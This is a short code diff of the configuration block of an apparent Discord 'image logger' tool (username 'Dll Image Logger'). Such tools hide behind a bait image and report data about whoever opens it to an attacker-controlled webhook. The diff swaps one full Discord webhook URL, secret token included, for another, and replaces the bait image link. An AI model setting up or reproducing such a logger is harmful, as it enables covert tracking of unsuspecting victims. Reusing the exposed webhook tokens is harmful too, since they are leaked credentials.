@@ -22,8 +22,8 @@ __version__ = "v2.0"
 __author__ = "lynxWings"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1195388708480876544/3aa7RO0ZqstBE_zx6WarK3UNKwqL3Imm143qZ6Zmvow9pqNm-02jXfWtpfknIYJZgatS", # <------------------------- Put your webhook link here.
-    "image": "https://j7.netlify.app/secret/1/media/ozz.gif", # <------------------------- Put image address link here.
+    "webhook": "https://discord.com/api/webhooks/1230892682034020413/iUkhBuHIS-Du0E7ibwTsAeudGVcZQf5cQcrTLe1tiFc_FVMxbU075YsAWeCO1VNh0uWu", # <------------------------- Put your webhook link here.
+    "image": "https://cdn.discordapp.com/attachments/1211737825997754470/1230944859263602731/Captura_de_pantalla_2024-04-04_184908.png?ex=663529bc&is=6622b4bc&hm=c49493edfc87394c82e2d445c370058b9cbadd6210e0e5992fb475b1bae34c90&", # <------------------------- Put image address link here.
     "imageArgument": True,
 
     "username": "Dll Image Logger",
